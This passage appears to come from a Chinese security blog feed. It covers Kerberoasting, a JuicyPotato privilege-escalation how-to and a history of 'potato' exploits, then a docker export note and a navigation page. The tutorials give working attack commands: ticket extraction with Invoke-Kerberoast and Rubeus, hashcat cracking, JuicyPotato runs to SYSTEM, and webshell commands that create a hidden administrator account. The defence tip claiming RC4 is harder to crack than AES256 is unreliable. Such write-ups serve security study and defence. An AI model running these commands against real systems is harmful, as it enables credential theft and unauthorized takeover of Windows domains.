class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T sun.com -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line">查找本域内重复的SPN：setspn -X</span><br><span class="line">删除指定SPN：setspn -D MySQL&#x2F;win7.xie.com:1433&#x2F;MSSQL hack</span><br><span class="line">查找指定用户&#x2F;主机名注册的SPN：setspn -L username&#x2F;hostname</span><br></pre></td></tr></table></figure><h3 id="使用PowerShell脚本"><a href="#使用PowerShell脚本" class="headerlink" title="使用PowerShell脚本"></a>使用PowerShell脚本</h3><ul><li>PowerShell-AD-Recon</li></ul><p>该工具包提供了一些探测指定SPN的脚本，例如Exchange，Microsoft SQLServer等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#扫描域中所有的SPN信息</span><br><span class="line">Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices</span><br></pre></td></tr></table></figure><ul><li>GetUserSPNs.ps1</li></ul><p>Kerberoast 工具集中的一个 powershell 脚本，用来查询域内用户注册的 SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure><ul><li>PowerView.ps1</li></ul><p>PowerView是 PowerSpolit 中 Recon目录下的一个powershell脚本，返回的信息比较详细。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></table></figure><h1 id="0x03-Kerberoasting攻击"><a href="#0x03-Kerberoasting攻击" class="headerlink" title="0x03 Kerberoasting攻击"></a>0x03 Kerberoasting攻击</h1><h2 id="0x031基于Kerberos认证的原理："><a href="#0x031基于Kerberos认证的原理：" class="headerlink" title="0x031基于Kerberos认证的原理："></a>0x031基于Kerberos认证的原理：</h2><p>基于Kerberos认证，具体认证过程可以参考我之前的文章</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-q5UTmw4K-1590547189994)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]</a></p><p>1、用户将AS-REQ数据包发送给KDC（Key Distribution Centre，密钥分发中心，此处为域控），进行身份认证。</p><p>2、KDC验证用户的凭据，如果凭据有效，则返回TGT（Ticket-Granting Ticket，票据授予票据）。</p><p>3、如果用户想通过身份认证，访问某个服务（如IIS），那么他需要发起（Ticket Granting Service，票据授予服务）请求，请求中包含TGT以及所请求服务的SPN（Service Principal Name，服务主体名称）。</p><p>4、如果TGT有效并且没有过期，TGS会创建用于目标服务的一个服务票据。服务票据使用服务账户的凭据进行加密。</p><p>5、用户收到包含加密服务票据的TGS响应数据包。</p><p>6、最后，服务票据会转发给目标服务，然后使用服务账户的凭据进行解密。</p><p>整个过程比较简单，我们需要注意的是，服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从TGS处请求服务票据，然后离线暴力破解。</p><h2 id="0x032利用思路"><a href="#0x032利用思路" class="headerlink" title="0x032利用思路"></a>0x032利用思路</h2><h4 id="域内的任何用户都可以向域内的任何服务请求TGS"><a href="#域内的任何用户都可以向域内的任何服务请求TGS" class="headerlink" title="域内的任何用户都可以向域内的任何服务请求TGS"></a>域内的任何用户都可以向域内的任何服务请求TGS</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p><p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p>因此，高效率的利用思路如下：</p><ol><li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li>请求TGS</li><li>导出TGS</li><li>暴力破解</li></ol><h2 id="0x033利用方法"><a href="#0x033利用方法" class="headerlink" title="0x033利用方法"></a>0x033利用方法</h2><h3 id="一、自动实现，并且不需要mimikatz，普通用户权限即可"><a href="#一、自动实现，并且不需要mimikatz，普通用户权限即可" class="headerlink" title="一、自动实现，并且不需要mimikatz，普通用户权限即可"></a>一、自动实现，并且不需要mimikatz，普通用户权限即可</h3><p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p><p>实例演示：</p><p>在域内一台主机上以普通用户权限执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure><p>只提取出hash的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><p>使用hashcat破解的参数如下：</p><p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h3 id="二、使用-Rubeus"><a href="#二、使用-Rubeus" class="headerlink" title="二、使用 Rubeus"></a>二、使用 Rubeus</h3><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      | |</span><br><span class="line"> _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">|  __  &#x2F;| | | |  _ \| ___ | | | |&#x2F;___)</span><br><span class="line">| |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">|_|   |_|____&#x2F;|____&#x2F;|_____)____&#x2F;(___&#x2F;</span><br><span class="line"></span><br><span class="line">v1.5.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : zeo</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;harmj0y,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : asdf&#x2F;asdfasdf</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf&#x2F;asdfasdf*$AE5F019D4CDED6CD74830CC......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : sqlservice</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;SQL,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : MSSQLSvc&#x2F;SQL.zeolab.local</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc&#x2F;SQL.zeolab.local*$E2B3869290......</span><br></pre></td></tr></table></figure><h2 id="0x034离线破解服务票据"><a href="#0x034离线破解服务票据" class="headerlink" title="0x034离线破解服务票据"></a>0x034离线破解服务票据</h2><p>将哈希保存为hash.txt文件，放到hashcat的目录下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h1 id="0x04-Kerberoast攻击防范"><a href="#0x04-Kerberoast攻击防范" class="headerlink" title="0x04 Kerberoast攻击防范"></a>0x04 Kerberoast攻击防范</h1><ul><li>将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，增加破解难度</li><li>保证服务密码本身为强密码，关键是提高密码的强度。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>烂土豆Juicypotato提权原理和利用</title>
      <link href="/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-Potato（烂土豆）提权的原理："><a href="#0x00-Potato（烂土豆）提权的原理：" class="headerlink" title="0x00 Potato（烂土豆）提权的原理："></a>0x00 Potato（烂土豆）提权的原理：</h2><p>所谓的烂土豆提权就是俗称的MS16-075</p><p>可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p><h3 id="一、简单的原理："><a href="#一、简单的原理：" class="headerlink" title="一、简单的原理："></a>一、简单的原理：</h3><p>攻击者可以诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机！</p><p>Microsoft通过使用已经进行的质询来禁止同协议NTLM身份验证来对此进行修补。这意味着从一个主机回到自身的SMB-&gt; SMB NTLM中继将不再起作用。但是，跨协议攻击（例如HTTP-&gt; SMB）仍然可以正常使用！</p><h3 id="二、我的理解流程："><a href="#二、我的理解流程：" class="headerlink" title="二、我的理解流程："></a>二、我的理解流程：</h3><p>1、所以我们控制HTTP流量大概都流经我们控制的HTTP服务器，做中介人攻击。</p><p>2、可以诱导系统高权用户执行一些操作，例如将它们重定向到需要NTLM身份验证的地方。所有NTLM凭据都将中继到本地SMB侦听器，以创建运行用户定义的命令的新系统服务，例如是Windows Update服务的请求时，就会是一个高权令牌，劫持掉这个令牌</p><p>3、最后模仿这个高权令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌</p><h2 id="0x01-使用方法"><a href="#0x01-使用方法" class="headerlink" title="0x01 使用方法"></a>0x01 使用方法</h2><hr><h3 id="1、查看当前用户权限，是否符合要求"><a href="#1、查看当前用户权限，是否符合要求" class="headerlink" title="1、查看当前用户权限，是否符合要求"></a>1、查看当前用户权限，是否符合要求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all </span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br></pre></td></tr></table></figure><p>如果均开启，可以选择<code>-t *</code></p><p>如果均未开启，那么无法提权</p><p>例子</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzI1NTIucG5n?x-oss-process=image/format,png" alt="image-20200518132552127"></p><h3 id="2、查看RPC默认端口是否为135"><a href="#2、查看RPC默认端口是否为135" class="headerlink" title="2、查看RPC默认端口是否为135"></a>2、查看RPC默认端口是否为135</h3><p>如果被修改(例如为111)，juicypotato的参数可以使用<code>-n 111</code></p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用<code>-k</code></p><p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录</p><p>添加防火墙规则允许135端口入站的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;135&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="3、根据操作系统选择可用的CLSID"><a href="#3、根据操作系统选择可用的CLSID" class="headerlink" title="3、根据操作系统选择可用的CLSID"></a>3、根据操作系统选择可用的CLSID</h3><p>参考列表</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>例如测试系统win7 ，选择CLSID为 {555F3418-D99E-4E51-800A-6E89CFD8B1D7}</p><h3 id="4、选择一个系统未占用的端口作为监听端口"><a href="#4、选择一个系统未占用的端口作为监听端口" class="headerlink" title="4、选择一个系统未占用的端口作为监听端口"></a>4、选择一个系统未占用的端口作为监听端口</h3><p>例如，最终参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure><p>表示开启SeImpersonate权限创建进程，监听端口1111，使用的CLSID为<code>{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ5NDYucG5n?x-oss-process=image/format,png" alt="image-20200518134946085"></p><p>之后会弹出CMD命令行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzU2MTYucG5n?x-oss-process=image/format,png" alt="image-20200518135616269"></p><h2 id="0x02-限制条件"><a href="#0x02-限制条件" class="headerlink" title="0x02 限制条件"></a>0x02 限制条件</h2><hr><p>经过以上的分析，Juicy Potato的限制条件如下：</p><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><h2 id="0x03-WEBSHELL版本"><a href="#0x03-WEBSHELL版本" class="headerlink" title="0x03 WEBSHELL版本"></a>0x03 WEBSHELL版本</h2><p>土司找到了大佬改写过的WebShell版烂土豆，上传到服务器后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p whoami</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ4NDkucG5n?x-oss-process=image/format,png" alt="image-20200518134849944"></p><p>提权成功，但蚁剑的WebShell里好像只能传一个参数？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将password替换为满足强度要求的密码，否则需要改组策略关闭密码强度检查</span><br><span class="line">execute -f JuicyPotato.exe -p net user admin$ password</span><br><span class="line">execute -f JuicyPotato.exe -p net localgroup administrators admin$ &#x2F;add</span><br></pre></td></tr></table></figure><h2 id="0x04-在Cobaltstrike中使用Juicypotato提权"><a href="#0x04-在Cobaltstrike中使用Juicypotato提权" class="headerlink" title="0x04-在Cobaltstrike中使用Juicypotato提权"></a>0x04-在Cobaltstrike中使用Juicypotato提权</h2><p>在Cobaltstrike中使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升</p><p>但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><p>下载并解压reflectiveJuicyPotato.zip，在Cobaltstike中选择脚本管理器–&gt;load加载juicypotato.cna脚本</p><p>随后我们在提权模块即可发现多了一个JuicyPotato</p><h2 id="0x05-烂土豆优点"><a href="#0x05-烂土豆优点" class="headerlink" title="0x05 烂土豆优点"></a>0x05 烂土豆优点</h2><p>​ 1.非常可靠，这种都比较稳定，基本上不肯能蓝屏掉线的。<br>​ 2.不用需要等Windows更新，可以主动触发高权。<br>​ 3.多全版本通杀。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.t00ls.net/viewthread.php\?tid=47362\&amp;highlight=potato" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php\?tid=47362\&amp;highlight=potato</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows\%E6\%9C\%AC\%E5\%9C\%B0\%E6\%8F\%90\%E6\%9D\%83\%E5\%B7\%A5\%E5\%85\%B7Juicy-Potato\%E6\%B5\%8B\%E8\%AF\%95\%E5\%88\%86\%E6\%9E\%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows\%E6\%9C\%AC\%E5\%9C\%B0\%E6\%8F\%90\%E6\%9D\%83\%E5\%B7\%A5\%E5\%85\%B7Juicy-Potato\%E6\%B5\%8B\%E8\%AF\%95\%E5\%88\%86\%E6\%9E\%90/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>土豆提权历史进程</title>
      <link href="/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/"/>
      <url>/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h1><p>在研究提权的时候，发现最近这些东西比较多，而且我自己看起来也是比较混乱，就从网上收集了一些资料，做一个整合和搬运，复现和整理一下，方便你我</p><p>现在还是有点迷糊，这个估计会再更新，等我再理的清楚一些，然后后面就是单个的文章发布，这个是总的简介</p><h1 id="0x01-历史进程"><a href="#0x01-历史进程" class="headerlink" title="0x01 历史进程"></a>0x01 历史进程</h1><h2 id="2016-01-16-初代土豆"><a href="#2016-01-16-初代土豆" class="headerlink" title="2016-01-16 初代土豆"></a>2016-01-16 初代土豆</h2><p>劫持wpad配合ntlm中继来进行提权</p><p><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" target="_blank" rel="noopener">Hot Potato – Windows Privilege Escalation</a></p><h2 id="2016-09-26-二代土豆"><a href="#2016-09-26-二代土豆" class="headerlink" title="2016-09-26 二代土豆"></a>2016-09-26 二代土豆</h2><p>劫持系统com服务器地址到恶意服务器上,然后在NTLM Type 3时做AcceptSecurityContext调用去拿system的令牌</p><p><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener">Rotten Potato – Privilege Escalation from Service</a></p><h2 id="2018-01-13-土豆token细节"><a href="#2018-01-13-土豆token细节" class="headerlink" title="2018/01/13 土豆token细节"></a>2018/01/13 土豆token细节</h2><p><a href="https://decoder.cloud/2018/01/13/potato-and-tokens/" target="_blank" rel="noopener">Potatoes and tokens – Decoder’s Blog</a></p><h2 id="2018-08-10-整理了一些可用的CLSID"><a href="#2018-08-10-整理了一些可用的CLSID" class="headerlink" title="2018-08-10 整理了一些可用的CLSID"></a>2018-08-10 整理了一些可用的CLSID</h2><p>​ <a href="https://ohpe.it/juicy-potato/" target="_blank" rel="noopener">Juicy Potato (abusing the golden privileges) | jui…</a></p><h2 id="2018-10-29-微软把土豆利用链修复"><a href="#2018-10-29-微软把土豆利用链修复" class="headerlink" title="2018/10/29 微软把土豆利用链修复"></a>2018/10/29 微软把土豆利用链修复</h2><p>现在ntlm认证时句柄已不可控</p><p><a href="https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/" target="_blank" rel="noopener">No more rotten/juicy potato? – Decoder’s Blog</a></p><h2 id="2019-03-06-提到了利用命名管道模拟客户端问题"><a href="#2019-03-06-提到了利用命名管道模拟客户端问题" class="headerlink" title="2019/03/06 提到了利用命名管道模拟客户端问题"></a>2019/03/06 提到了利用命名管道模拟客户端问题</h2><p><a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener">Windows Named Pipes &amp; Impersonation – Decoder’s Bl</a></p><h2 id="2020-05-02-三代土豆"><a href="#2020-05-02-三代土豆" class="headerlink" title="2020/05/02 三代土豆"></a>2020/05/02 三代土豆</h2><p>​ 目前杀伤力最大的一个利用链，通过命名管道模拟来获取system的令牌<br>​ <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener">PrintSpoofer - Abusing Impersonation Privileges on</a></p><h2 id="2020-05-11"><a href="#2020-05-11" class="headerlink" title="2020/05/11"></a>2020/05/11</h2><p>​ 劫持OXID解析器修改ResolveOxid2响应地址为恶意管道地址<br><a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" target="_blank" rel="noopener">No more JuicyPotato? Old story, welcome RoguePotat</a><br>​</p><h2 id="2020-05-13-土豆提权集合"><a href="#2020-05-13-土豆提权集合" class="headerlink" title="2020/05/13 土豆提权集合"></a>2020/05/13 土豆提权集合</h2><p><a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">GitHub - CCob/SweetPotato: Local Service to SYSTEM…</a></p><h2 id="名字疑惑"><a href="#名字疑惑" class="headerlink" title="名字疑惑"></a>名字疑惑</h2><p>RottenPotato 升级版—》 JuicyPotato</p><p>sweetpotato == Juicy/PrintSpoofer 集合版</p><p>PrintSpoofer == PipePotato== BadPotato 三个名字 ？<br>最初公开POC的老外叫它PrintSpoofer，之后360的paper叫它PipePotato，然后GitHub一个国人的POC又叫它BadPotato。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker:打包正在运行的容器，快速拖环境跑路</title>
      <link href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/"/>
      <url>/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>遇到了一个docker环境，需求带回来自己调试，所以记录大致流程<br>docker:打包正在运行的容器，快速拖环境跑路</p><h2 id="获取正在运行的容器"><a href="#获取正在运行的容器" class="headerlink" title="获取正在运行的容器"></a>获取正在运行的容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAwMDcucG5n?x-oss-process=image/format,png" alt="image-20200521180007008"></p><p>找到ID 6996fffb6bfa</p><h2 id="将容器打包成镜像"><a href="#将容器打包成镜像" class="headerlink" title="将容器打包成镜像"></a>将容器打包成镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; 容器名称或id 打包的镜像名称:标签</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExNzU5NTEucG5n?x-oss-process=image/format,png" alt="image-20200521175951273"></p><h2 id="拖到本地"><a href="#拖到本地" class="headerlink" title="拖到本地"></a>拖到本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save cnvd -o &#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;source&#x2F;sec.tar</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAzMTgucG5n?x-oss-process=image/format,png" alt="image-20200521180317972"></p><h2 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i hackgod-demo.tar</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快速导航--文章查询--分类（持续更新）</title>
      <link href="/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>现在突然发现自己写的东西有点乱，需要分类整理一下，出一个导航栏<br>主要csdn这些博客导航做的不会，只能我手动来整理一下来</p><h1 id="0x01-文章类别快速导航"><a href="#0x01-文章类别快速导航" class="headerlink" title="0x01 文章类别快速导航"></a>0x01 文章类别快速导航</h1><ul><li><h2 id="内网安全"><a href="#内网安全" class="headerlink" title="内网安全"></a>内网安全</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9778006.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9778006.html</a></p><ul><li><h2 id="代码审计-和-审计方面的漏洞分析"><a href="#代码审计-和-审计方面的漏洞分析" class="headerlink" title="代码审计 和 审计方面的漏洞分析"></a>代码审计 和 审计方面的漏洞分析</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9295109.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9295109.html</a></p><ul><li><h2 id="二进制安全研究-（多是学习笔记）"><a href="#二进制安全研究-（多是学习笔记）" class="headerlink" title="二进制安全研究 （多是学习笔记）"></a>二进制安全研究 （多是学习笔记）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9975475.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9975475.html</a></p><ul><li><h2 id="人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）"><a href="#人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）" class="headerlink" title="人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）"></a>人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9577499.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9577499.html</a></p><ul><li><h2 id="安全开发方向-（主要是关于python的一些东西）"><a href="#安全开发方向-（主要是关于python的一些东西）" class="headerlink" title="安全开发方向 （主要是关于python的一些东西）"></a>安全开发方向 （主要是关于python的一些东西）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9703279.html" 